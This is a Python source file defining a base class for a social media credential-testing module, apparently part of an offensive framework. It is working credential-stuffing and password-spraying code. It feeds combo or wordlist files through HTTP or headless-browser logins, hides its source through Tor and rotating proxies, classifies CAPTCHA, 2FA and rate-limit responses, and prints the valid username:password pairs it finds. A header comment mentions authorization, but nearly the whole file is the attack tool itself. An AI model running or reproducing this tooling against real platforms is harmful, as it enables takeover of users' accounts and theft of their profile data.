"""
Base class for social media credential testing.
All platform modules inherit from this.

WARNING: Only use on platforms you have WRITTEN AUTHORIZATION to test.
"""
import time
import json
import random
import shutil
import threading
import hashlib
from abc import abstractmethod
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse
from webforg.core.module import BaseAuxiliaryModule, Option
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich import box
from concurrent.futures import ThreadPoolExecutor, as_completed

console = Console()

# ---- Optional headless-browser (Playwright) support ----
try:
    from playwright.sync_api import sync_playwright
    _HAS_PLAYWRIGHT = True
except ImportError:
    sync_playwright = None
    _HAS_PLAYWRIGHT = False

_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

_CHROME = (shutil.which("chrome") or shutil.which("chromium")
           or shutil.which("chromium-browser") or "/usr/local/bin/chrome")

_thread_local = threading.local()
_browser_registry: list = []
_browser_lock = threading.Lock()


@dataclass
class LoginResult:
    """Result of a single login attempt."""
    username: str
    password: str
    success: bool
    status_code: int = 0
    error_type: str = ""
    response_time_ms: float = 0.0
    session_token: str = ""
    profile_data: dict = field(default_factory=dict)
    requires_2fa: bool = False
    requires_challenge: bool = False


@dataclass
class AccountProfile:
    """Profile data extracted from a successful login."""
    platform: str
    username: str
    email: str = ""
    display_name: str = ""
    user_id: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    followers_count: int = 0
    following_count: int = 0
    account_age_days: int = 0
    is_verified: bool = False
    is_private: bool = False
    extra: dict = field(default_factory=dict)


class BaseSocialLoginTester(BaseAuxiliaryModule):
    """
    Base class for testing credentials against social media platforms.

    Features:
    - Proxy rotation (TOR, HTTP, SOCKS5)
    - Rate limit handling with exponential backoff
    - CAPTCHA/Challenge detection
    - 2FA detection
    - Account enumeration (email exists check)
    - Profile extraction on success
    """

    name = "base_social_login_tester"
    description = "Base class for social media credential testing"
    author = "webforg"
    rank = "manual"

    # ---- Declarative headless-browser login flow config (subclasses override) ----
    platform_name = "generic"
    login_url = ""                            # HTTP fallback login endpoint
    browser_login_url = ""                    # set to enable the browser flow
    username_selector = "input[name=username]"
    password_selector = "input[type=password]"
    username_submit_selector = ""             # button to advance from username step (e.g. "Next")
    post_load_delay_ms = 1500                 # settle time after the form renders
    page_load_timeout_ms = 20000              # upper bound for the initial page load
    submit_enter = True                       # press Enter on the password field first
    submit_selectors = ("button[type=submit]", "button:has-text('Log in')", "button:has-text('Sign in')")
    browser_login_paths = ("/login", "/signin", "/sign-in", "/log-in", "/accounts/login")
    challenge_frame_keywords = ()             # URL substrings of captcha/verify iframes
    rate_markers = (
        "too many attempts", "try again later", "maximum number of attempts",
        "try again in", "temporarily", "rate limit", "rate-limited", "slow down",
        "please wait a few", "many login attempts",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "confirm it's you",
        "are you a robot", "prove you're not a robot", "slide to", "bot detection",
    )
    twofa_markers = (
        "two-factor", "two factor", "2fa", "verification code", "authenticator app",
        "enter the code", "one-time code", "check your email for a code",
        "verify your identity", "confirm your identity", "2-step verification",
    )
    invalid_markers = (
        "incorrect password", "wrong password", "invalid password",
        "invalid username or password", "password is incorrect", "username or password",
        "email or password", "incorrect username", "doesn't exist", "account not found",
        "couldn't find your account", "no account found", "login error", "invalid login",
    )

    def _build_options(self) -> None:
        self.add_option("RHOSTS", Option(str, required=True, description="Target platform domain"))
        self.add_option("RPORT", Option(int, required=False, default=None, description="Target port"))
        self.add_option("SSL", Option(bool, required=False, default=False, description="Use SSL"))
        self.add_option("TARGETURI", Option(str, required=False, default="/", description="Base path"))
        self.add_option("USERNAME", Option(str, required=False, description="Single username to test"))
        self.add_option("EMAIL", Option(str, required=False, description="Single email to test"))
        self.add_option("PASSWORD", Option(str, required=False, description="Single password to test"))
        self.add_option("USER_FILE", Option(str, required=False, description="File with usernames/emails (one per line)"))
        self.add_option("PASS_FILE", Option(str, required=False, description="File with passwords (one per line)"))
        self.add_option("COMBOS_FILE", Option(str, required=False, description="File with user:pass combos (one per line)"))
        self.add_option("THREADS", Option(int, required=False, default=2, description="Concurrent threads (keep low)"))
        self.add_option("DELAY_MS", Option(int, required=False, default=3000, description="Delay between attempts (ms)"))
        self.add_option("PROXY_FILE", Option(str, required=False, description="Proxy list file"))
        self.add_option("PROXY_ROTATE", Option(bool, required=False, default=True, description="Rotate proxies per attempt"))
        self.add_option("TIMEOUT", Option(int, required=False, default=15, description="Request timeout (seconds)"))
        self.add_option("MODE", Option(str, required=False, default="combo", description="combo | user_pass_cross"))
        self.add_option("SUCCESS_ONLY", Option(bool, required=False, default=False, description="Only log successful attempts"))
        self.add_option("EXTRACT_PROFILE", Option(bool, required=False, default=True, description="Extract profile on success"))
        self.add_option("STOP_ON_SUCCESS", Option(bool, required=False, default=False, description="Stop on first success per user"))

        # Browser attempts are stateful + slow: serialize them and default to a
        # single-username x passfile spray unless the operator overrides.
        if self.browser_login_url:
            self._options["THREADS"].set(1)
            self._options["MODE"].set("user_pass_cross")

    def __init__(self):
        super().__init__()
        self.platform_name = type(self).platform_name
        self.login_url = type(self).login_url
        self._last_profile = None
        self._rate_limited = False
        self.success_indicators = []
        self.failure_indicators = []
        self.rate_limit_indicators = []
        self.challenge_indicators = []
        self.twofa_indicators = []
        self.account_locked_indicators = []
        self.headers = {}
        self.proxies = []
        self.proxy_index = 0
        self._stats = {
            "attempted": 0,
            "successful": 0,
            "rate_limited": 0,
            "challenged": 0,
            "errors": 0,
        }

    def _load_proxies(self) -> list[str]:
        proxy_file = self.get_option("PROXY_FILE")
        if proxy_file:
            try:
                with open(proxy_file) as f:
                    return [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                console.print(f"  [bold red]>[/] Proxy file not found: {proxy_file}")
        return ["socks5://127.0.0.1:9050"]

    def _get_next_proxy(self) -> Optional[dict]:
        if not self.proxies:
            self.proxies = self._load_proxies()
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index % len(self.proxies)]
        self.proxy_index += 1
        return {"http://": proxy, "https://": proxy}

    def _build_request_headers(self) -> dict:
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": f"https://{self.platform_name}.com",
            "Referer": f"https://{self.platform_name}.com/",
        }

    def _build_login_payload(self, username: str, password: str) -> dict:
        return {"username": username, "password": password}

    def parse_login_response(self, response, username: str, password: str) -> LoginResult:
        return LoginResult(username=username, password=password, success=False, error_type="not_implemented")

    def extract_profile(self, session_token: str, username: str) -> Optional[AccountProfile]:
        return AccountProfile(
            platform=self.platform_name,
            username=username,
            profile_url=f"https://{self.platform_name}.com/{username}",
        )

    def attempt_login(self, username: str, password: str) -> LoginResult:
        if self._use_browser():
            return self._browser_attempt(username, password)
        return self._http_attempt(username, password)

    def _http_attempt(self, username: str, password: str) -> LoginResult:
        start = time.time()
        headers = self._build_request_headers()
        payload = self._build_login_payload(username, password)

        try:
            resp = self.target.session.post(
                self.login_url,
                data=payload,
                headers=headers,
                timeout=self.get_option("TIMEOUT"),
            )
            elapsed = (time.time() - start) * 1000
            result = self.parse_login_response(resp, username, password)
            result.response_time_ms = elapsed
            self._stats["attempted"] += 1
            if result.success:
                self._stats["successful"] += 1
            if result.error_type == "rate_limited":
                self._stats["rate_limited"] += 1
            elif result.error_type == "challenge":
                self._stats["challenged"] += 1
            return result
        except Exception as e:
            self._stats["errors"] += 1
            return LoginResult(username=username, password=password, success=False, error_type=f"connection_error: {str(e)[:50]}")

    # ---- headless-browser login flow ----

    def _use_browser(self) -> bool:
        return bool(self.browser_login_url) and _HAS_PLAYWRIGHT

    def _get_browser(self):
        """Playwright sync API is thread-bound: cache one instance per thread."""
        if getattr(_thread_local, "pw", None) is None:
            pw = sync_playwright().start()
            browser = pw.chromium.launch(
                headless=True,
                executable_path=_CHROME,
                args=["--no-sandbox", "--disable-gpu"],
            )
            _thread_local.pw = pw
            _thread_local.browser = browser
            with _browser_lock:
                _browser_registry.append((pw, browser))
        return _thread_local.browser

    def _close_thread_browsers(self):
        with _browser_lock:
            items = list(_browser_registry)
            _browser_registry.clear()
        for pw, browser in items:
            try:
                browser.close()
            except Exception:
                pass
            try:
                pw.stop()
            except Exception:
                pass
        _thread_local.pw = None
        _thread_local.browser = None

    def _classify_outcome(self, page) -> tuple:
        """Return (status, detail) from the rendered login page."""
        body = ""
        try:
            body = page.inner_text("body")[:8000].lower()
            body = body.replace("\u2019", "'").replace("\u2018", "'")
        except Exception:
            pass
        for m in self.rate_markers:
            if m in body:
                return "rate_limited", m
        for f in page.frames:
            fu = f.url.lower()
            if any(k in fu for k in self.challenge_frame_keywords):
                return "challenge", fu[:100]
        for m in self.twofa_markers:
            if m in body:
                return "2fa_required", m
        for m in self.challenge_markers:
            if m in body:
                return "challenge", m
        try:
            url_path = page.url.split("?")[0].lower()
            current_host = (urlparse(page.url).hostname or "").lower()
        except Exception:
            url_path, current_host = "", ""
        login_host = (urlparse(self.browser_login_url).hostname or "").lower()
        if current_host and current_host != login_host:
            return "success", page.url
        if not any(p in url_path for p in self.browser_login_paths):
            return "success", page.url
        for m in self.invalid_markers:
            if m in body:
                return "invalid_credentials", m
        return None, None

    def _submit_login(self, page):
        if self.submit_enter:
            try:
                page.press(self.password_selector, "Enter")
                return
            except Exception:
                pass
        last = None
        for sel in self.submit_selectors:
            try:
                page.click(sel, timeout=8000)
                return
            except Exception as e:
                last = e
        if last is not None:
            raise last

    def _browser_result(self, username: str, password: str, status: str, detail, status_code: int) -> LoginResult:
        result = LoginResult(username=username, password=password, success=(status == "success"), status_code=status_code)
        result.profile_data = {"detail": detail or ""}
        if status == "success":
            result.session_token = "browser-session"
        elif status in ("rate_limited", "challenge", "2fa_required", "invalid_credentials", "account_not_found", "timeout"):
            result.error_type = status
        else:
            result.error_type = f"browser_error: {status}"
        return result

    def _browser_login(self, username: str, password: str) -> LoginResult:
        browser = self._get_browser()
        ctx = browser.new_context(
            user_agent=_UA,
            viewport={"width": 1280, "height": 800},
            locale="en-US",
        )
        page = ctx.new_page()
        try:
            timeout = (self.get_option("TIMEOUT") or 15) * 1000
            timeout = max(timeout, self.page_load_timeout_ms)
            try:
                page.goto(self.browser_login_url, wait_until="domcontentloaded", timeout=timeout)
            except Exception:
                # Some sites (e.g. Snapchat) never fire domcontentloaded but
                # still render the form; keep waiting on the selector below.
                pass
            try:
                page.wait_for_selector(self.username_selector, timeout=min(timeout, 25000))
                page.wait_for_timeout(self.post_load_delay_ms)
            except Exception:
                status, detail = self._classify_outcome(page)
                if status:
                    return self._browser_result(username, password, status, detail, 200)
                return LoginResult(username=username, password=password, success=False,
                                   error_type="browser_error: login form not rendered", status_code=200)
            page.fill(self.username_selector, username)

            if self.username_submit_selector:
                pw_found = False
                for _ in range(3):
                    try:
                        page.click(self.username_submit_selector, timeout=5000)
                    except Exception:
                        pass
                    try:
                        page.wait_for_selector(self.password_selector, timeout=5000)
                        pw_found = True
                        break
                    except Exception:
                        continue
                if not pw_found:
                    status, detail = self._classify_outcome(page)
                    if status:
                        return self._browser_result(username, password, status, detail, 200)
                    return LoginResult(username=username, password=password, success=False,
                                       error_type="browser_error: password form not rendered", status_code=200)

            page.fill(self.password_selector, password)
            self._submit_login(page)
            deadline = time.time() + (self.get_option("TIMEOUT") or 15)
            status = detail = None
            while time.time() < deadline:
                page.wait_for_timeout(1200)
                status, detail = self._classify_outcome(page)
                if status:
                    break
            if not status:
                status, detail = "timeout", "no outcome detected"

            result = self._browser_result(username, password, status, detail, 200)
            if status == "success":
                self._last_profile = AccountProfile(
                    platform=self.platform_name,
                    username=username,
                    display_name=username,
                    profile_url=f"https://{self.platform_name}.com/{username}",
                )
            return result
        except Exception as e:
            return LoginResult(username=username, password=password, success=False,
                               error_type=f"browser_error: {str(e)[:80]}")
        finally:
            try:
                ctx.close()
            except Exception:
                pass

    def _browser_attempt(self, username: str, password: str) -> LoginResult:
        if self._rate_limited:
            # IP is already rate-limited: skip the page load entirely.
            result = LoginResult(username=username, password=password, success=False, error_type="rate_limited")
            self._stats["attempted"] += 1
            self._stats["rate_limited"] += 1
            return result
        start = time.time()
        result = self._browser_login(username, password)
        result.response_time_ms = (time.time() - start) * 1000
        self._stats["attempted"] += 1
        if result.success:
            self._stats["successful"] += 1
        elif result.error_type == "rate_limited":
            self._rate_limited = True
            self._stats["rate_limited"] += 1
        elif result.error_type in ("challenge", "2fa_required"):
            self._stats["challenged"] += 1
        else:
            self._stats["errors"] += 1
        return result

    def _rate_limit_backoff(self, attempt_num: int):
        base_delay = (self.get_option("DELAY_MS") or 3000) / 1000
        jitter = random.uniform(0, 1)
        delay = base_delay * (2 ** min(attempt_num, 5)) + jitter
        time.sleep(min(delay, 30))

    def _load_wordlist(self, option_name: str) -> list[str]:
        path = self.get_option(option_name)
        if not path:
            return []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            console.print(f"  [bold red]>[/] File not found: {path}")
            return []

    def _load_combos(self) -> list[tuple[str, str]]:
        path = self.get_option("COMBOS_FILE")
        if not path:
            users = self._load_wordlist("USER_FILE")
            if not users and self.get_option("USERNAME"):
                users = [self.get_option("USERNAME")]
            if not users and self.get_option("EMAIL"):
                users = [self.get_option("EMAIL")]
            passes = self._load_wordlist("PASS_FILE")
            if not passes and self.get_option("PASSWORD"):
                passes = [self.get_option("PASSWORD")]
            if not users or not passes:
                return []
            mode = self.get_option("MODE") or "combo"
            if mode == "combo":
                return [(users[i], passes[i]) for i in range(min(len(users), len(passes)))]
            return [(u, p) for u in users for p in passes]

        try:
            combos = []
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        user, pwd = line.split(":", 1)
                        combos.append((user.strip(), pwd.strip()))
            return combos
        except FileNotFoundError:
            console.print(f"  [bold red]>[/] File not found: {path}")
            return []

    def _log_result(self, result: LoginResult, results: dict):
        entry = {
            "username": result.username,
            "password": result.password,
            "success": result.success,
            "error_type": result.error_type,
            "response_time_ms": round(result.response_time_ms, 1),
            "session_token": result.session_token,
        }
        if result.error_type == "rate_limited":
            results["rate_limited"].append(entry)
            if not self.get_option("SUCCESS_ONLY"):
                console.print(f"  [bold yellow]△[/] RATE LIMITED: {result.username}")
        elif result.error_type == "challenge":
            results["challenged"].append(entry)
            if not self.get_option("SUCCESS_ONLY"):
                console.print(f"  [bold yellow][!][/] CHALLENGE: {result.username}")
        elif result.error_type and "2fa" in result.error_type:
            results["challenged"].append(entry)
            if not self.get_option("SUCCESS_ONLY"):
                console.print(f"  [bold yellow][2FA][/] 2FA REQUIRED: {result.username}")
        elif result.success:
            results["successful"].append(entry)
            console.print(f"  [bold green][OK][/] VALID: {result.username}:{result.password}")
        else:
            results["failed"].append(entry)
            if not self.get_option("SUCCESS_ONLY"):
                console.print(f"  [dim][FAIL][/] {result.username} — {result.error_type}")

    def run(self) -> dict:
        if self.browser_login_url and not _HAS_PLAYWRIGHT:
            console.print("  [bold red]>[/] This platform requires Playwright + Chromium (pip install playwright).")
            return {"success": False, "error": "playwright_missing"}
        self._rate_limited = False
        if self._use_browser():
            console.print("  [dim green]>[/] Using headless Chromium login flow")
        try:
            return self._run_impl()
        finally:
            if self._use_browser():
                self._close_thread_browsers()

    def _run_impl(self) -> dict:
        combos = self._load_combos()
        if not combos:
            console.print("  [bold red]>[/] No credentials to test.")
            return {"success": False, "error": "no_credentials"}

        console.print(f"  [bold green]>[/] Testing [bold]{len(combos)}[/] credentials against [bold]{self.platform_name}[/]")
        console.print(f"  [dim green]>[/] Delay: {self.get_option('DELAY_MS')}ms  Threads: {self.get_option('THREADS')}")
        console.print()

        results = {
            "platform": self.platform_name,
            "total": len(combos),
            "successful": [],
            "failed": [],
            "rate_limited": [],
            "challenged": [],
            "profiles": [],
        }
        threads = self.get_option("THREADS") or 2

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold green]{task.description}[/]"),
            BarColumn(bar_width=30),
            MofNCompleteColumn(),
            TextColumn("•"),
            TextColumn("[bold]{task.fields[stats]}[/]"),
        ) as progress:
            task = progress.add_task(f"Testing {self.platform_name}", total=len(combos), stats="0 found")

            def try_combo(combo):
                user, pwd = combo
                return self.attempt_login(user, pwd)

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(try_combo, c): c for c in combos}
                for future in as_completed(futures):
                    result = future.result()
                    self._log_result(result, results)
                    if result.success and self.get_option("EXTRACT_PROFILE") and result.session_token:
                        try:
                            profile = self.extract_profile(result.session_token, result.username)
                            if profile:
                                results["profiles"].append({
                                    "platform": profile.platform,
                                    "username": profile.username,
                                    "display_name": profile.display_name,
                                    "user_id": profile.user_id,
                                    "profile_url": profile.profile_url,
                                    "followers": profile.followers_count,
                                    "verified": profile.is_verified,
                                })
                        except Exception:
                            pass
                    progress.update(task, advance=1, stats=f"[bold green]{len(results['successful'])}[/] found")
                    if self.get_option("STOP_ON_SUCCESS") and result.success:
                        executor.shutdown(wait=False)
                        break
                    time.sleep((self.get_option("DELAY_MS") or 3000) / 1000)

        # Results table
        table = Table(title=f"{self.platform_name.title()} Results", box=box.ROUNDED, border_style="bold green")
        table.add_column("Username", style="bold cyan")
        table.add_column("Password", style="bold yellow")
        table.add_column("Status", width=12)
        table.add_column("Time", width=8)

        for r in results["successful"]:
            table.add_row(r["username"], r["password"], "[bold green]VALID[/]", f"{r['response_time_ms']:.0f}ms")
        for r in results["rate_limited"]:
            table.add_row(r["username"], "—", "[bold yellow]RATE LIM[/]", f"{r['response_time_ms']:.0f}ms")
        for r in results["challenged"]:
            table.add_row(r["username"], "—", "[bold yellow]2FA/CHAL[/]", f"{r['response_time_ms']:.0f}ms")
        console.print(table)

        # Summary
        s = self._stats
        console.print(Panel(
            f"[bold]Attempted:[/] {s['attempted']}  "
            f"[bold green]Valid:[/] {s['successful']}  "
            f"[bold yellow]Rate Limited:[/] {s['rate_limited']}  "
            f"[bold yellow]Challenged:[/] {s['challenged']}  "
            f"[dim]Errors:[/] {s['errors']}",
            border_style="bold green",
        ))

        if results["successful"]:
            console.print()
            console.print("  [bold green]═══ VALID CREDENTIALS ═══[/]")
            for r in results["successful"]:
                console.print(f"  [bold green][OK][/] [bold]{r['username']}[/]:[bold yellow]{r['password']}[/]")
            console.print()

        return {
            "success": True,
            "platform": self.platform_name,
            "results": results,
            "stats": s,
        }
